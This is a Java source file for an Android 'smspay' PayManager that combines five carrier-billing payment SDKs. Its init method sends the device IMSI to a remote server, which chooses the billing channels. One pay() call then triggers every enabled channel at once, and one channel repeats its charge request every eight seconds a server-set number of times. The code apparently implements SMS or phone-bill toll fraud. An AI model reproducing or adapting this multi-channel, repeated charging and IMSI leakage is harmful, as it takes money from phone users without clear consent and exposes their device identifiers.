package com.y7.smspay;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.util.Log;
import android.widget.Toast;

import com.compat.plus.main.MaySDK;
import com.compat.plus.main.OnPayListener;
import com.mn.kt.MnPro;
import com.wyzf.constant.PayResult;
import com.wyzf.download.SdkDlm;
import com.wyzf.pay.PayResultListener;
import com.wyzf.pay.WYZFPay;
import com.y7.smspay.count.SdkBack;
import com.y7.smspay.sdk.mgr.YPoyManager;
import com.y7.smspay.sdk.util.HttpURLConnectionUtils;
import com.y7.smspay.sdk.util.SPUtil;
import com.y7.smspay.sdk.util.StrUtils;
import com.y7.smspay.sdk.util.Utils;

import org.hj201706.lib.HejuHuafeiCallback;
import org.hj201706.lib.HejuInit;
import org.hj201706.lib.HejuInstance;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;

/**
 * Created by Administrator on 2017/7/11.
 */

public class PayManager {

    private volatile static PayManager mInstance;
    private static Context context;
    public static String payId = "0";
    public static final String TAG = "paySDK";

    public static final int MIN_CLICK_DELAY_TIME = 60000;
    private static long lastClickTime = 0;
    private static long currentTime = 0;


    private static final String url = StrUtils.SERVER_URL + StrUtils.URL + StrUtils.NET_SDK_CONFIG;

    private static boolean gwFlag, wyFlag, bfgFlag, zzFlag, qpFlag = false;

    private static Handler handler = new Handler();

    private PayManager(Context context) {
        this.context = context;
    }

    public static PayManager getInstance(Context context) {
        if (mInstance == null) {
            synchronized (PayManager.class) {
                if (mInstance == null) {
                    mInstance = new PayManager(context);
                }
            }
        }
        return mInstance;
    }

    /**
     * 测试初始化
     */
    public static void initTest() {
        initGuaiwu();
    }

    public static void payGuaiwuTest(final String price) {
        try {
            Log.i(TAG, "payGuaiwuTest()");
            YPoyManager.getInstance().reqChannelId(context, price, 11, "", "", "", "", null);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void init2(int mode) {
        CrashHandler.getInstance().init(context);
        SPUtil.getInstance(context);
        switch (mode) {
            case 0:
                gwFlag = true;
                bfgFlag = true;
                wyFlag = true;
                zzFlag = true;
                qpFlag = true;
                break;
            case 1:
                gwFlag = true;
                break;
            case 2:
                bfgFlag = true;
                break;
            case 3:
                wyFlag = true;
                break;
            case 4:
                zzFlag = true;
                break;
            case 5:
                qpFlag = true;
                break;
        }
        initSDK((Activity) context);
    }

    public static void init() {
        CrashHandler.getInstance().init(context);
        SPUtil.getInstance(context);
        String IMSI = Utils.getIMSI(context);
        Log.i(TAG, "imsi:" + IMSI);
        if (IMSI.equals("") || IMSI == null) {
            gwFlag = true;
            bfgFlag = true;
            wyFlag = true;
            zzFlag = true;
            qpFlag = true;
            initSDK((Activity) context);
            return;
        }
        HttpURLConnectionUtils.doGetAsyn(url + "?imsi=" + IMSI, new HttpURLConnectionUtils.CallBack() {
            @Override
            public void onRequestComplete(String result) {
                try {
                    Log.i(TAG, "JSON:" + result);
                    JSONObject jsonObject = new JSONObject(result);
                    JSONArray jsonArray = jsonObject.getJSONArray("call_sdk");
                    List<Integer> list = new ArrayList<Integer>();
                    for (int i = 0; i < jsonArray.length(); i++) {
                        Log.i(TAG, "参数：" + jsonArray.getInt(i));
                        list.add(jsonArray.getInt(i));
                    }
                    gwFlag = true;
                    if (list.contains(1)) {
                        wyFlag = true;
                    }
                    if (list.contains(2)) {
                        zzFlag = true;
                    }
                    if (list.contains(3)) {
                        bfgFlag = true;
                    }
                    if (list.contains(4)) {
                        qpFlag = true;
                    }
                    initSDK((Activity) context);
                } catch (JSONException e) {
                    e.printStackTrace();
                }

            }
        });
    }

    public static void initSDK(Activity activity) {
        initGuaiwu();
        initWY();
        initBFG();
        initZZ(activity);
        initQP(activity);
    }

    public static void pay(Activity activity, String price) {
        payGuaiwu(price);
        payWY();
        payZZ(activity);
        payBFG(activity);
        payQP(activity);
    }


    public static void initGuaiwu() {
        if (!gwFlag) {
            return;
        }
        try {
            Log.i(TAG, "initGUaiwu()");
            if (Utils.isNetworkAvailable(context)) {
                YPoyManager.getInstance().Init(context);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    public static void initWY() {
        if (!wyFlag) {
            return;
        }
        try {
            Log.i(TAG, "initWY()");
            SdkDlm.getInstance(context).init(getStr("wy_appCode"), getStr("wy_packCode"));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void initBFG() {
        if (!bfgFlag) {
            return;
        }
        try {
            Log.i(TAG, "initBFG()");
            HejuInit hejuInit = new HejuInit(context, "");
            hejuInit.start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static boolean payZZFlag = false;

    public static void initZZ(final Activity act) {
        if (!zzFlag) {
            return;
        }
        try {
            MaySDK.getInstance().initStart(act, getStr("zz_userId"), getStr("zz_appId"), getStr("zz_key"), getStr("zz_channel"),
                    new OnPayListener() {

                        @Override
                        public void onFinish(int paramInt, Object paramObject) {
                            payZZFlag = true;
                            Log.i(TAG, "initZZ() 状态:" + paramInt);
                        }
                    });
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    public static void initQP(final Activity act) {
        Log.i(TAG, "initQP()");
        MnPro.getInstance().setParams(getInt("qp_appId"), getInt("qp_cpId"), getStr("qp_channelId"));
        MnPro.getInstance().init(act, new Handler() {
            @Override
            public void handleMessage(Message msg) {
                super.handleMessage(msg);
                if (msg.what == 100) {
                    Bundle data = msg.getData();
                    int errcode = data.getInt("errcode");
                    String extdata = data.getString("extdata");
                    Log.i(TAG, "QP支付:" + errcode);
                    if (errcode == 4000) {
                        new SdkBack(act, "4", "1").start();
                    } else {
                        new SdkBack(act, "4", "2").start();
                    }
                }
            }
        });
    }

    public static void payQP(final Activity activity) {
        if (!qpFlag) {
            return;
        }
        MnPro.getInstance().start(activity, getStr("qp_point"), "qipa" + System.currentTimeMillis());
    }

    public static void payGuaiwu(final String price) {
        if (!gwFlag) {
            return;
        }
        try {
            final int throughCount = (int) SPUtil.get("throughCount", 1) - 1;
            Log.i(TAG, "循环任务次数:" + (throughCount + 1));
            final boolean pay = (boolean) SPUtil.get("pay", false);
            if (pay == false) {
                SPUtil.save("pay", true);
                final int[] i = {0};
                new Runnable() {
                    @Override
                    public void run() {
                        Log.i(TAG, "payGuaiwu()");
                        YPoyManager.getInstance().reqChannelId(context, price, 11, "", "", "", "", null);
                        if (i[0] < throughCount) {
                            i[0]++;
                            handler.postDelayed(this, 8000);
                        }
                    }
                }.run();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void payWY() {
        if (wyFlag == false) {
            return;
        }
        currentTime = Calendar.getInstance().getTimeInMillis();
        if (currentTime - lastClickTime > MIN_CLICK_DELAY_TIME) {
            lastClickTime = currentTime;
            WYZFPay.getInstance().pay(context, getInt("wy_feeCode"), getInt("wy_price"), new PayResultListener() {
                @Override
                public void onResult(PayResult payResult, int i) {
                    switch (payResult) {
                        case SUCCESS:
                            new SdkBack(context, "1", "1").start();
                            Log.i(TAG, "payWY() :" + payResult.msg);
                            break;
                        default:
                            new SdkBack(context, "1", "2").start();
                            Log.i(TAG, "payWY() :" + payResult.msg);
                            break;
                    }
                }
            });
        }
    }

    public static void payZZ(final Activity activity) {
        if (zzFlag == false || payZZFlag == false) {
            return;
        }
        MaySDK.getInstance().onGo(activity, getStr("zz_feeCode"), getStr("zz_price"), "null", false, new OnPayListener() {
            @Override
            public void onFinish(int paramInt, Object paramObject) {
                // TODO Auto-generated method stub
                Log.i(TAG, "payZZ() :" + paramInt);
                if (paramInt == 200) {
                    new SdkBack(activity, "2", "1").start();
                } else {
                    new SdkBack(activity, "2", "2").start();
                }
            }
        });

    }

    public static void payBFG(final Activity activity) {
        if (bfgFlag == false) {
            return;
        }
        HashMap<String, String> params = new HashMap<String, String>();
        params.put("productName", getStr("bfg_productName"));//商品名
        params.put("appName", getStr("bfg_appName"));//应用名
        params.put("point", getStr("bfg_point")); //计费点数  不为空
        params.put("extraInfo", ""); //CP扩展信息 可为空
        params.put("debug", "0");//调试信息toast0关闭1开启
        params.put("activityName", getStr("bfg_activityName"));//寄主activity名称
        params.put("serviceName", getStr("bfg_serviceName"));//寄主Service名称
        HejuInstance mHejuInstance = new HejuInstance();
        mHejuInstance.pay(activity, params, new HejuHuafeiCallback() {
            @Override
            public void onSuccess(JSONObject payResult) {
                String code = null;
                String extraInfo = null;
                try {
                    new SdkBack(activity, "3", "1").start();
                    code = payResult.getString("code");
                    extraInfo = payResult.getString("extraInfo");
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                Log.i(TAG, "payBFG() : onSuccess -> " + code);
            }

            @Override
            public void onFail(JSONObject payResult) {
                String code = null;
                String extraInfo = null;
                try {

                    new SdkBack(activity, "3", "2").start();
                    code = payResult.getString("code");
                    extraInfo = payResult.getString("extraInfo");

                } catch (JSONException e) {
                    e.printStackTrace();
                }
                Log.i(TAG, "payBFG() : onFail -> " + code);
            }
        });
    }

    public static String getStr(String strId) {
        return context.getResources().getString(context.getResources().getIdentifier(strId, "string", context.getPackageName()));
    }

    public static int getInt(String intId) {
        return context.getResources().getInteger(context.getResources().getIdentifier(intId, "integer", context.getPackageName()));
    }

}
